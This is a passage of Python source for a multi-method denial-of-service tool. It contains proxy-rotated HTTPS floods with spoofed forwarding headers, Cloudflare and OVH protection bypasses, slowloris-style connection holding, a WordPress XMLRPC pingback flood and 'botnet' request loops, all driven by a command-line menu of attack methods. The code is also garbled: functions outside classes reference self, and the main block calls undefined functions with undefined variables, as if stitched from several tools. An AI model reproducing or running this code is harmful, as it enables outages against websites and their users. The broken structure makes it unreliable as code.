                                  f"Host: {self._target.authority}\r\n" +
                                  "User-Agent: null\r\n" +
                                  "Referrer: null\r\n" +
                                  self.SpoofIP + "\r\n")
        with suppress(Exception), self.open_connection() as s:
            for _ in range(10000 // num_threads if FIRST_RUN else 50000 // num_threads):
                Tools.send(s, payload)

    def emulate_requests():
        global REQUESTS_SENT, BYTES_SENT
        with suppress(Exception):
            with requests.Session() as ss:
                for _ in range(10000 // num_threads if FIRST_RUN else 50000 // num_threads):
                    # Perform custom requests or tests here
                    # Example:
                    with ss.get(self._target.url) as res:
                        REQUESTS_SENT += 1
                        BYTES_SENT += len(res.content)
                        if REQUESTS_SENT >= (10000 if FIRST_RUN else 50000):
                            break

    FIRST_RUN = False

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_requests)
        threads.append(thread)
        thread.start()

    for _ in range(num_threads):
        emulated_thread = threading.Thread(target=emulate_requests)
        threads.append(emulated_thread)
        emulated_thread.start()

    for thread in threads:
        thread.join()



def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assembled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assembled

def attack(url, timer, threads, methods):
    def Launchspoof(url, timer):
        socksCrawler()  
        prox = open("./socks5.txt", 'r').read().split('\n')
        proxy = random.choice(prox).strip().split(":")
        timelol = time.time() + int(timer)
        m = random.choice(method)
        user_agent = random.choice(useragents)
        req = m + url + " / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
        req += user_agent + "\r\n"
        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
        req += "X-Forwarded-Proto: Http\r\n"
        req += "X-Forwarded-Host: " + urlparse(url).netloc + ", 1.1.1.1\r\n"
        req += "Via: " + spoofer() + "\r\n"
        req += "Client-IP: " + spoofer() + "\r\n"
        req += "X-Forwarded-For: " + spoofer() + "\r\n"
        req += "Real-IP: " + spoofer() + "\r\n"
        req += "Connection: Keep-Alive\r\n\r\n"
        while time.time() < timelol:
            try:
                s = socks.socksocket()
                s.connect((str(urlparse(url).netloc), int(443)))
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
                s.send(str.encode(req))
                try:
                    for i in range(200):
                        s.send(str.encode(req))
                        s.send(str.encode(req))
                except:
                    s.close()
            except:
                s.close()

    for i in range(int(threads)):
        threading.Thread(target=Launchspoof, args=(url, timer)).start()


def https_spoof():
    url = input("Enter URL: ")
    time = input("Enter time: ")
    thread = input("Enter threads: ")
    
    subprocess.run(['python3', 'https-spoof.py', url, time, thread])


def LaunchCFPRO(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFPRO(url, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False)
            scraper.get(url=url, headers=headers, allow_redirects=False)
        except:
            pass
        
def attackbypass(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=Launchbypass, args=(url, timer)).start()

def Launchbypass(url, timer):
    prox = open("./http.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(timer)
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m + url+" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(200):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()




def BOTNET_V2(method, num_requests, url, data=None):
    global REQUESTS_SENT, BYTES_SEND

    # Генеруємо ключ для шифрування
    encryption_key = Fernet.generate_key()
    cipher_suite = Fernet(encryption_key)

    with Session() as ss:
        requests = []

        for _ in range(num_requests):
            if method == 'GET':
                requests.append(ss.get(url))
            elif method == 'POST':
                if data:
                    encrypted_data = cipher_suite.encrypt(json.dumps(data).encode())
                    requests.append(ss.post(url, data=encrypted_data))
            elif method == 'HEAD':
                requests.append(ss.head(url))

        for res in requests:
            with suppress(Exception):
                REQUESTS_SENT += 1
                BYTES_SEND += len(res.content)

def PPS(self) -> None:
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, self._defaultpayload)
        Tools.safe_close(s)

def run_threads(url, num_threads, methods):
    threads = []
    for _ in range(num_threads):
        for method in methods:
            t = None
            if method == 'OVH BOT':
                t = threading.Thread(target=worker, args=(url,))
            elif method == 'OVH':
                t = threading.Thread(target=ovh_bypass, args=(url,))
            elif method == 'DGB':
                t = threading.Thread(target=DGB, args=(url,))
            elif method == 'AVB':
                t = threading.Thread(target=AVB, args=(url,))
            elif method == 'CFBUAM':
                t = threading.Thread(target=CFBUAM, args=(url,))
            elif method == 'BYPASS':
                t = threading.Thread(target=BYPASS, args=(url,))
            elif method == 'CFB':
                t = threading.Thread(target=CFB)
            elif method == 'uambypass':
                t = threading.Thread(target=uambypass, args=(url,))
            elif method == 'BOTNET_V1':
                t = threading.Thread(target=BOTNET_V1, args=(url,))
            if t:
                threads.append(t)
                t.start()

    for t in threads:
        t.join()

def KILLER(url):
    while True:
        threading.Thread(target=send_request, args=(url, 'GET'), daemon=True).start()

def SLOW(url):
    payload: bytes = generate_payload()
    s = None
    with suppress(Exception), open_connection() as s:
        for _ in range(self._rpc):
            Tools.send(s, payload)
        while Tools.send(s, payload) and s.recv(1):
            for i in range(self._rpc):
                keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                Tools.send(s, keep)
                sleep(self._rpc / 15)
                break
    Tools.safe_close(s)


def BOTNET(method, num_requests, url):
    global REQUESTS_SENT, BYTES_SEND
    with suppress(Exception):
        with Session() as ss:
            for _ in range(num_requests):
                if method == 'GET':
                    with ss.get(url) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += len(res.content)
                elif method == 'POST':
                    with ss.post(url) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += len(res.content)
                elif method == 'HEAD':
                    with ss.head(url) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += len(res.content)
                        
async def ttt(event, payload, url, rpc):
    global cps, pps
    while True:
        context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
        context.options |= ssl.OP_NO_SSLv2
        context.options |= ssl.OP_NO_SSLv3
        reader, writer = await asyncio.open_connection(url.hostname, url.port or 443, ssl=context)
        await event.wait()
        cps += 1
        for _ in range(rpc):
            writer.write(payload)
            await writer.drain()
            pps += 1




async def dns_flood(target, num_requests=200000, debug=False):
    url = urllib.parse.urlsplit(target)
    rpc = 200000
    timer = 10  # Время атаки в секундах

    event = asyncio.Event()
    event.clear()
    payload = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {url.hostname}\r\n"
        f"\r\n"
    ).encode('latin-1')

    async def main(url, rpc):
        nonlocal event, payload
        event.clear()

        for _ in range(num_requests):
            asyncio.create_task(ttt(event, payload, url, rpc))
            await asyncio.sleep(.0)

        event.set()
        print("Attack Started")

    async def logger():
        global cps, pps
        nonlocal timer

        while timer > 0:
            timer -= 1
            await asyncio.sleep(1)
            print("PPS: %d CPS: %d" % (pps, cps))
            pps, cps = 0, 0

    asyncio.run(main(url, rpc))
    asyncio.run(logger())

def XMLRPC(url):
    payload: bytes = generate_payload(
        ("Content-Length: 345\r\n"
         "X-Requested-With: XMLHttpRequest\r\n"
         "Content-Type: application/xml\r\n\r\n"
         "<?xml version='1.0' encoding='iso-8859-1'?>"
         "<methodCall><methodName>pingback.ping</methodName>"
         "<params><param><value><string>%s</string></value>"
         "</param><param><value><string>%s</string>"
         "</value></param></params></methodCall>") %
        (ProxyTools.Random.rand_str(64),
         ProxyTools.Random.rand_str(64)))[:-2]
    s = None
    with suppress(Exception), open_connection() as s:
        for _ in range(self._rpc):
            Tools.send(s, payload)
    Tools.safe_close(s)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', required=True, help='URL to send requests to')
    parser.add_argument('--methods', nargs='+', default=['GET'], choices=['GET', 'POST', 'HEAD', 'HTTP-SYN', 'HTTP-SYN-TPC', 'OVH', 'OVH BOT', 'DGB', 'AVB', 'CFBUAM', 'BYPASS', 'CFB', 'GSB', 'uambypass', 'BOTNET_V1','BOTNET_V2', 'SYN', 'AMP', 'socks_cflow', 'TCP_ATTACK', 'CFSOC',  'BOMB', 'ovh2',  'STRESS', 'Connection', 'TLSv2',  'cc', 'ntp_mem','ICMPFlood','UDPFlood','udp_flood','attackSKY','RHEX','NULL','COOKIES','Launchspoof','attackbypass','LaunchCFPRO','dgb_solver','http_flood','PPS','dns_flood','BOT_V1','https_spoof','KILLER'], help='HTTP methods')
    parser.add_argument('--threads', type=int, default=1, help='Number of threads to use')
    parser.add_argument('--data', help='Data to send with POST request')
    args = parser.parse_args()

    generated_ip = fake_ip()
    print("Generated IP:", generated_ip)

    run_threads(args.url, args.threads, args.methods)
    
    KILLER(args.url)
    RHEX(self)
    NULL(self)
    BOT(self)
    open_connection(self,
                        conn_type=AF_INET,
                        sock_type=SOCK_STREAM,
                        proto_type=IPPROTO_TCP)
    SLOW(args.url)
    attackSKY(url, timer, threads)
    XMLRPC(args.url)
    BOTNET(args.url)
    BOTNET_V2(method, num_requests, url, data=None)
    BOT_V1(args.url)
    check_tgt(args.url)
    network_attack(args.url)
    UDPFlood(args.url, args.port, args.repeat)
    http_flood(args.url)
    ttt(event, payload, url, rpc)
    ICMPFlood(args.url, args.port, args.repeat)
    worker(args.url)
    udp_flood(args.url)
    ntp_mem(event, socks_type, ind_rlock, num_threads)
    attack = Attack(args.url, target_port, requests_per_connection, max_connections, rotation_interval)
    asyncio.run(attack.main())
    spoof_ip = "X-Forwarded-For: 1.2.3.4"
    rpc = 5